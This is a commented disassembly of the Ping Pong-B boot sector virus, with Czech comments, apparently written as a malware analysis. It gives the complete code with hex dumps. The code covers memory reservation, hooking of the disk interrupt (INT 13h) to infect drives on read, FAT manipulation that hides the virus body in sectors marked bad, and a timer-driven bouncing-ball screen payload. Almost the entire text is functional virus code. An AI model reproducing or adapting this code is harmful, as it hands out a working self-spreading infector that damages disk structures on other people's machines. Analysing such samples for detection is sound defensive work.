;=====================================================================
; Ping Pong -B virus  ziskan 08/20/1990 od Janciho Piatnici. Detekovan
; programem SCAN 2.7V57.
;
0:7C00 EB1C           JMP    7C1E

0:7C00  EB 1C 90 50 43 20 54 6F-6F 6C 73 00 02 02 01 00  k..PC Tools.....
0:7C10  02 70 00 D0 02 FD 02 00-09 00 02 00 00 00 33 C0  .p.P.}........3@
                                      ===== pocet stran
                                ===== pocet sektoru na stopu

0:7C1E 33C0           XOR    AX,AX     ; Definice stacku pod pamet
0:7C20 8ED0           MOV    SS,AX     ; s BOOT sektorem.
0:7C22 BC007C         MOV    SP,7C00
0:7C25 8ED8           MOV    DS,AX
0:7C27 A11304         MOV    AX,[0413] ; RAM pamet v KB
0:7C2A 2D0200         SUB    AX,0002   ;     zmensime o 2 KByte
0:7C2D A31304         MOV    [0413],AX ;==========================
0:7C30 B106           MOV    CL,06     ; Prepocitame na paragrafy.
0:7C32 D3E0           SHL    AX,CL     ;
0:7C34 2DC007         SUB    AX,07C0   ;
0:7C37 8EC0           MOV    ES,AX     ;
0:7C39 BE007C         MOV    SI,7C00   ;
0:7C3C 8BFE           MOV    DI,SI     ;
0:7C3E B90001         MOV    CX,0100   ;
0:7C41 F3             REPZ             ; a kopirujeme 512 byte
0:7C42 A5             MOVSW            ; nahoru do pameti.
0:7C43 8EC8           MOV    CS,AX     ; A zde jednoduse provedeme
CS:7C45 0E             PUSH   CS        ; skok na kopirovany kod.
CS:7C46 1F             POP    DS
CS:7C47 E80000         CALL   7C4A

CS:7C4A 32E4           XOR    AH,AH     ; Reset disku nebo diskety.
CS:7C4C CD13           INT    13        ;--------------------------
CS:7C4E 8026F87D80     AND    Byte Ptr [7DF8],80  ; Pevny disk nebo A:
CS:7C53 8B1EF97D       MOV    BX,[7DF9] ; Cislo sektoru s pokracovanim
CS:7C57 0E             PUSH   CS        ; viru.
CS:7C58 58             POP    AX        ;
CS:7C59 2D2000         SUB    AX,0020   ;
CS:7C5C 8EC0           MOV    ES,AX
CS:7C5E E83C00         CALL   7C9D      ; Nacteni
CS:7C61 8B1EF97D       MOV    BX,[7DF9] ; Cislo sektoru s pokracovanim
CS:7C65 43             INC    BX        ; viru.
CS:7C66 B8C0FF         MOV    AX,FFC0   ; Nacitame na adresu CS:7C00
CS:7C69 8EC0           MOV    ES,AX     ; (na PC/AT asi chyba.
CS:7C6B E82F00         CALL   7C9D
CS:7C6E 33C0           XOR    AX,AX
CS:7C70 A2F77D         MOV    [7DF7],AL ; Vynulovani VIRUS aktivni.
CS:7C73 8ED8           MOV    DS,AX
CS:7C75 A14C00         MOV    AX,[004C]  ; Precteme obsluhu 13H
CS:7C78 8B1E4E00       MOV    BX,[004E]  ; a definuleme novou.
CS:7C7C C7064C00D07C   MOV    Word Ptr [004C],7CD0
CS:7C82 8C0E4E00       MOV    [004E],CS
CS:7C86 0E             PUSH   CS
CS:7C87 1F             POP    DS
CS:7C88 A32A7D         MOV    [7D2A],AX  ; Novou hodnotu prepisujeme
CS:7C8B 891E2C7D       MOV    [7D2C],BX  ; primo do skoku.
CS:7C8F 8A16F87D       MOV    DL,[7DF8]
CS:7C93 EA007C0000     JMP    000CS:7C00  ; Skok na BOOT sektor.

;--------------------------------------------------------------------
; Procedura zapisu na disk.
;
CS:7C98 B80103         MOV    AX,0301   ;
CS:7C9B EB03           JMP    7CA0
;
; Procedura cteni z disku.
;
CS:7C9D B80102         MOV    AX,0201   ; Cti disk, adresa
CS:7CA0 93             XCHG   AX,BX             ; Vypocet stopy
CS:7CA1 03061C7C       ADD    AX,[7C1C]
CS:7CA5 33D2           XOR    DX,DX
CS:7CA7 F736187C       DIV    Word Ptr [7C18]   ; Vydel poctem sektoru
CS:7CAB FEC2           INC    DL                ; na stopu.
CS:7CAD 8AEA           MOV    CH,DL             ; Cislo sektoru 1..n.
CS:7CAF 33D2           XOR    DX,DX
CS:7CB1 F7361A7C       DIV    Word Ptr [7C1A]   ; Vydel poctem hlav.
CS:7CB5 B106           MOV    CL,06             ; Stopa na 10 bitech,
CS:7CB7 D2E4           SHL    AH,CL             ; sektor na 6 bitech.
CS:7CB9 0AE5           OR     AH,CH             ;
CS:7CBB 8BC8           MOV    CX,AX
CS:7CBD 86E9           XCHG   CH,CL
CS:7CBF 8AF2           MOV    DH,DL             ; Cislo hlavy.
CS:7CC1 8BC3           MOV    AX,BX             ; Obnov puvodni AX.
CS:7CC3 8A16F87D       MOV    DL,[7DF8]         ; Cislo driveru.
CS:7CC7 BB0080         MOV    BX,8000           ; Cteme na ES:8000
CS:7CCA CD13           INT    13                ;
CS:7CCC 7301           JNB    7CCF              ; Pokud bez chyby, ko-
CS:7CCE 58             POP    AX                ; nec. Pri chybe opa-
CS:7CCF C3             RET                      ; kovat operaci.

;====================================================================
; OBSLUHA PRERUSENI 13H
;
CS:7CD0 1E             PUSH   DS
CS:7CD1 06             PUSH   ES
CS:7CD2 50             PUSH   AX
CS:7CD3 53             PUSH   BX
CS:7CD4 51             PUSH   CX
CS:7CD5 52             PUSH   DX
CS:7CD6 0E             PUSH   CS
CS:7CD7 1F             POP    DS
CS:7CD8 0E             PUSH   CS
CS:7CD9 07             POP    ES
CS:7CDA F606F77D01     TEST   Byte Ptr [7DF7],01 ; Je virus aktivni?
CS:7CDF 7542           JNZ    7D23               ;       ANO -- konec.
CS:7CE1 80FC02         CMP    AH,02              ; Pokud neni sluzba
CS:7CE4 753D           JNZ    7D23               ; READ, koncime.
CS:7CE6 3816F87D       CMP    [7DF8],DL  ; Porovnej s cislem driveru.
CS:7CEA 8816F87D       MOV    [7DF8],DL  ; Pokud jsou ruzne, 
CS:7CEE 7522           JNZ    7D12                           skaceme.
CS:7CF0 32E4           XOR    AH,AH      ; Cti cas. Vystup v CX:DX
CS:7CF2 CD1A           INT    1A
CS:7CF4 F6C67F         TEST   DH,7F
CS:7CF7 750A           JNZ    7D03
CS:7CF9 F6C2F0         TEST   DL,F0
CS:7CFC 7505           JNZ    7D03
CS:7CFE 52             PUSH   DX
CS:7CFF E8B101         CALL   7EB3
CS:7D02 5A             POP    DX
CS:7D03 8BCA           MOV    CX,DX
CS:7D05 2B16B07E       SUB    DX,[7EB0]
CS:7D09 890EB07E       MOV    [7EB0],CX
CS:7D0D 83EA24         SUB    DX,+24
CS:7D10 7211           JB     7D23
CS:7D12 800EF77D01     OR     Byte Ptr [7DF7],01
CS:7D17 56             PUSH   SI
CS:7D18 57             PUSH   DI
CS:7D19 E81200         CALL   7D2E
CS:7D1C 5F             POP    DI
CS:7D1D 5E             POP    SI
CS:7D1E 8026F77DFE     AND    Byte Ptr [7DF7],FE ; Virus neni aktivni.
CS:7D23 5A             POP    DX
CS:7D24 59             POP    CX
CS:7D25 5B             POP    BX
CS:7D26 58             POP    AX
CS:7D27 07             POP    ES
CS:7D28 1F             POP    DS
CS:7D29 EAC00B00C8     JMP    C800:0BC0   ; Sem  je  prepsana  hodnota
                                          ; puvodniho vektoru intr.

CS:7D2E B80102         MOV    AX,0201     ; Cteme prvni sektor, prvni
CS:7D31 B600           MOV    DH,00       ; stopa, hlava 0.
CS:7D33 B90100         MOV    CX,0001
CS:7D36 E88AFF         CALL   7CC3
CS:7D39 F606F87D80     TEST   Byte Ptr [7DF8],80      ; Pevny disk ?
CS:7D3E 7423           JZ     7D63
CS:7D40 BEBE81         MOV    SI,81BE
CS:7D43 B90400         MOV    CX,0004
CS:7D46 807C0401       CMP    Byte Ptr [SI+04],01
CS:7D4A 740C           JZ     7D58
CS:7D4C 807C0404       CMP    Byte Ptr [SI+04],04
CS:7D50 7406           JZ     7D58
CS:7D52 83C610         ADD    SI,+10
CS:7D55 E2EF           LOOP   7D46
CS:7D57 C3             RET
CS:7D58 8B14           MOV    DX,[SI]
CS:7D5A 8B4C02         MOV    CX,[SI+02]
CS:7D5D B80102         MOV    AX,0201     ; Cti
CS:7D60 E860FF         CALL   7CC3
CS:7D63 BE0280         MOV    SI,8002
CS:7D66 BF027C         MOV    DI,7C02
CS:7D69 B91C00         MOV    CX,001C
CS:7D6C F3             REPZ
CS:7D6D A4             MOVSB
CS:7D6E 813EFC815713   CMP    Word Ptr [81FC],1357
CS:7D74 7515           JNZ    7D8B
CS:7D76 803EFB8100     CMP    Byte Ptr [81FB],00
CS:7D7B 730D           JNB    7D8A
CS:7D7D A1F581         MOV    AX,[81F5]
CS:7D80 A3F57D         MOV    [7DF5],AX
CS:7D83 8B36F981       MOV    SI,[81F9]
CS:7D87 E90801         JMP    7E92
CS:7D8A C3             RET
CS:7D8B 813E0B800002   CMP    Word Ptr [800B],0200
CS:7D91 75F7           JNZ    7D8A
CS:7D93 803E0D8002     CMP    Byte Ptr [800D],02
CS:7D98 72F0           JB     7D8A
CS:7D9A 8B0E0E80       MOV    CX,[800E]
CS:7D9E A01080         MOV    AL,[8010]
CS:7DA1 98             CBW
CS:7DA2 F7261680       MUL    Word Ptr [8016]
CS:7DA6 03C8           ADD    CX,AX
CS:7DA8 B82000         MOV    AX,0020
CS:7DAB F7261180       MUL    Word Ptr [8011]
CS:7DAF 05FF01         ADD    AX,01FF
CS:7DB2 BB0002         MOV    BX,0200
CS:7DB5 F7F3           DIV    BX
CS:7DB7 03C8           ADD    CX,AX
CS:7DB9 890EF57D       MOV    [7DF5],CX
CS:7DBD A1137C         MOV    AX,[7C13]
CS:7DC0 2B06F57D       SUB    AX,[7DF5]
CS:7DC4 8A1E0D7C       MOV    BL,[7C0D]
CS:7DC8 33D2           XOR    DX,DX
CS:7DCA 32FF           XOR    BH,BH
CS:7DCC F7F3           DIV    BX
CS:7DCE 40             INC    AX
CS:7DCF 8BF8           MOV    DI,AX
CS:7DD1 8026F77DFB     AND    Byte Ptr [7DF7],FB
CS:7DD6 3DF00F         CMP    AX,0FF0
CS:7DD9 7605           JBE    7DE0
CS:7DDB 800EF77D04     OR     Byte Ptr [7DF7],04
CS:7DE0 BE0100         MOV    SI,0001
CS:7DE3 8B1E0E7C       MOV    BX,[7C0E]
CS:7DE7 4B             DEC    BX
CS:7DE8 891EF37D       MOV    [7DF3],BX
CS:7DEC C606B27EFE     MOV    Byte Ptr [7EB2],FE
CS:7DF1 EB0D           JMP    7E00

CS:7DF0  FE EB 0D 01 00 0C 00 01-00 02 02 00 57 13 55 AA  ~k..........W.U*
                             == virus je aktivni.
                                   =====  cislo sektoru, kde je pokracovani viru

;====================================================================
; Tato cast programu je nactena pozdeji.
;
CS:7E00 FF06F37D       INC    Word Ptr [7DF3]
CS:7E04 8B1EF37D       MOV    BX,[7DF3]
CS:7E08 8006B27E02     ADD    Byte Ptr [7EB2],02
CS:7E0D E88DFE         CALL   7C9D
CS:7E10 EB39           JMP    7E4B
CS:7E12 B80300         MOV    AX,0003
CS:7E15 F606F77D04     TEST   Byte Ptr [7DF7],04
CS:7E1A 7401           JZ     7E1D
CS:7E1C 40             INC    AX
CS:7E1D F7E6           MUL    SI
CS:7E1F D1E8           SHR    AX,1
CS:7E21 2A26B27E       SUB    AH,[7EB2]
CS:7E25 8BD8           MOV    BX,AX
CS:7E27 81FBFF01       CMP    BX,01FF
CS:7E2B 73D3           JNB    7E00
CS:7E2D 8B970080       MOV    DX,[BX+8000]
CS:7E31 F606F77D04     TEST   Byte Ptr [7DF7],04
CS:7E36 750D           JNZ    7E45
CS:7E38 B104           MOV    CL,04
CS:7E3A F7C60100       TEST   SI,0001
CS:7E3E 7402           JZ     7E42
CS:7E40 D3EA           SHR    DX,CL
CS:7E42 80E60F         AND    DH,0F
CS:7E45 F7C2FFFF       TEST   DX,FFFF
CS:7E49 7406           JZ     7E51
CS:7E4B 46             INC    SI
CS:7E4C 3BF7           CMP    SI,DI
CS:7E4E 76C2           JBE    7E12
CS:7E50 C3             RET
CS:7E51 BAF7FF         MOV    DX,FFF7
CS:7E54 F606F77D04     TEST   Byte Ptr [7DF7],04
CS:7E59 750D           JNZ    7E68
CS:7E5B 80E60F         AND    DH,0F
CS:7E5E B104           MOV    CL,04
CS:7E60 F7C60100       TEST   SI,0001
CS:7E64 7402           JZ     7E68
CS:7E66 D3E2           SHL    DX,CL
CS:7E68 09970080       OR     [BX+8000],DX
CS:7E6C 8B1EF37D       MOV    BX,[7DF3]
CS:7E70 E825FE         CALL   7C98
CS:7E73 8BC6           MOV    AX,SI
CS:7E75 2D0200         SUB    AX,0002
CS:7E78 8A1E0D7C       MOV    BL,[7C0D]
CS:7E7C 32FF           XOR    BH,BH
CS:7E7E F7E3           MUL    BX
CS:7E80 0306F57D       ADD    AX,[7DF5]
CS:7E84 8BF0           MOV    SI,AX
CS:7E86 BB0000         MOV    BX,0000
CS:7E89 E811FE         CALL   7C9D
CS:7E8C 8BDE           MOV    BX,SI
CS:7E8E 43             INC    BX
CS:7E8F E806FE         CALL   7C98
CS:7E92 8BDE           MOV    BX,SI
CS:7E94 8936F97D       MOV    [7DF9],SI
CS:7E98 0E             PUSH   CS
CS:7E99 58             POP    AX
CS:7E9A 2D2000         SUB    AX,0020
CS:7E9D 8EC0           MOV    ES,AX
CS:7E9F E8F6FD         CALL   7C98
CS:7EA2 0E             PUSH   CS
CS:7EA3 58             POP    AX
CS:7EA4 2D4000         SUB    AX,0040
CS:7EA7 8EC0           MOV    ES,AX
CS:7EA9 BB0000         MOV    BX,0000
CS:7EAC E8E9FD         CALL   7C98
CS:7EAF C3             RET
CS:7EB0 764B           JBE    7EFD
CS:7EB2 00F6           ADD    DH,DH
CS:7EB4 06             PUSH   ES
CS:7EB5 F77D02         IDIV   Word Ptr [DI+02]
CS:7EB8 7524           JNZ    7EDE
CS:7EBA 800EF77D02     OR     Byte Ptr [7DF7],02
CS:7EBF B80000         MOV    AX,0000
CS:7EC2 8ED8           MOV    DS,AX
CS:7EC4 A12000         MOV    AX,[0020]
CS:7EC7 8B1E2200       MOV    BX,[0022]
CS:7ECB C7062000DF7E   MOV    Word Ptr [0020],7EDF
CS:7ED1 8C0E2200       MOV    [0022],CS
CS:7ED5 0E             PUSH   CS
CS:7ED6 1F             POP    DS
CS:7ED7 A3C97F         MOV    [7FC9],AX
CS:7EDA 891ECB7F       MOV    [7FCB],BX
CS:7EDE C3             RET
CS:7EDF 1E             PUSH   DS
CS:7EE0 50             PUSH   AX
CS:7EE1 53             PUSH   BX
CS:7EE2 51             PUSH   CX
CS:7EE3 52             PUSH   DX
CS:7EE4 0E             PUSH   CS
CS:7EE5 1F             POP    DS
CS:7EE6 B40F           MOV    AH,0F
CS:7EE8 CD10           INT    10
CS:7EEA 8AD8           MOV    BL,AL
CS:7EEC 3B1ED47F       CMP    BX,[7FD4]
CS:7EF0 7435           JZ     7F27
CS:7EF2 891ED47F       MOV    [7FD4],BX
CS:7EF6 FECC           DEC    AH
CS:7EF8 8826D67F       MOV    [7FD6],AH
CS:7EFC B401           MOV    AH,01
CS:7EFE 80FB07         CMP    BL,07
CS:7F01 7502           JNZ    7F05
CS:7F03 FECC           DEC    AH
CS:7F05 80FB04         CMP    BL,04
CS:7F08 7302           JNB    7F0C
CS:7F0A FECC           DEC    AH
CS:7F0C 8826D37F       MOV    [7FD3],AH
CS:7F10 C706CF7F0101   MOV    Word Ptr [7FCF],0101
CS:7F16 C706D17F0101   MOV    Word Ptr [7FD1],0101
CS:7F1C B403           MOV    AH,03
CS:7F1E CD10           INT    10
CS:7F20 52             PUSH   DX
CS:7F21 8B16CF7F       MOV    DX,[7FCF]
CS:7F25 EB23           JMP    7F4A
CS:7F27 B403           MOV    AH,03
CS:7F29 CD10           INT    10
CS:7F2B 52             PUSH   DX
CS:7F2C B402           MOV    AH,02
CS:7F2E 8B16CF7F       MOV    DX,[7FCF]
CS:7F32 CD10           INT    10
CS:7F34 A1CD7F         MOV    AX,[7FCD]
CS:7F37 803ED37F01     CMP    Byte Ptr [7FD3],01
CS:7F3C 7503           JNZ    7F41
CS:7F3E B80783         MOV    AX,8307
CS:7F41 8ADC           MOV    BL,AH
CS:7F43 B90100         MOV    CX,0001
CS:7F46 B409           MOV    AH,09
CS:7F48 CD10           INT    10
CS:7F4A 8B0ED17F       MOV    CX,[7FD1]
CS:7F4E 80FE00         CMP    DH,00
CS:7F51 7505           JNZ    7F58
CS:7F53 80F5FF         XOR    CH,FF
CS:7F56 FEC5           INC    CH
CS:7F58 80FE18         CMP    DH,18
CS:7F5B 7505           JNZ    7F62
CS:7F5D 80F5FF         XOR    CH,FF
CS:7F60 FEC5           INC    CH
CS:7F62 80FA00         CMP    DL,00
CS:7F65 7505           JNZ    7F6C
CS:7F67 80F1FF         XOR    CL,FF
CS:7F6A FEC1           INC    CL
CS:7F6C 3A16D67F       CMP    DL,[7FD6]
CS:7F70 7505           JNZ    7F77
CS:7F72 80F1FF         XOR    CL,FF
CS:7F75 FEC1           INC    CL
CS:7F77 3B0ED17F       CMP    CX,[7FD1]
CS:7F7B 7517           JNZ    7F94
CS:7F7D A1CD7F         MOV    AX,[7FCD]
CS:7F80 2407           AND    AL,07
CS:7F82 3C03           CMP    AL,03
CS:7F84 7505           JNZ    7F8B
CS:7F86 80F5FF         XOR    CH,FF
CS:7F89 FEC5           INC    CH
CS:7F8B 3C05           CMP    AL,05
CS:7F8D 7505           JNZ    7F94
CS:7F8F 80F1FF         XOR    CL,FF
CS:7F92 FEC1           INC    CL
CS:7F94 02D1           ADD    DL,CL
CS:7F96 02F5           ADD    DH,CH
CS:7F98 890ED17F       MOV    [7FD1],CX
CS:7F9C 8916CF7F       MOV    [7FCF],DX
CS:7FA0 B402           MOV    AH,02
CS:7FA2 CD10           INT    10
CS:7FA4 B408           MOV    AH,08
CS:7FA6 CD10           INT    10
CS:7FA8 A3CD7F         MOV    [7FCD],AX
CS:7FAB 8ADC           MOV    BL,AH
CS:7FAD 803ED37F01     CMP    Byte Ptr [7FD3],01
CS:7FB2 7502           JNZ    7FB6
CS:7FB4 B383           MOV    BL,83
CS:7FB6 B90100         MOV    CX,0001
CS:7FB9 B80709         MOV    AX,0907
CS:7FBC CD10           INT    10
CS:7FBE 5A             POP    DX
CS:7FBF B402           MOV    AH,02
CS:7FC1 CD10           INT    10
CS:7FC3 5A             POP    DX
CS:7FC4 59             POP    CX
CS:7FC5 5B             POP    BX
CS:7FC6 58             POP    AX
CS:7FC7 1F             POP    DS
CS:7FC8 EA20000000     JMP    0000:0020

CS:7FC0                                         00 00 01  .M.ZY[X.j ......
CS:7FD0  01 01 01 00 FF FF 50 B7-B7 B7 B6 40 40 88 DE E6  ......P7776@@.^f
CS:7FE0  5A AC D2 E4 EA E6 40 50-EC 40 64 5C 60 52 40 40  Z,Rdjf@Pl@d\`R@@
CS:7FF0  40 40 64 62 5E 62 60 5E-70 6E 40 41 B7 B7 B7 B6  @@db^b`^pn@A7776
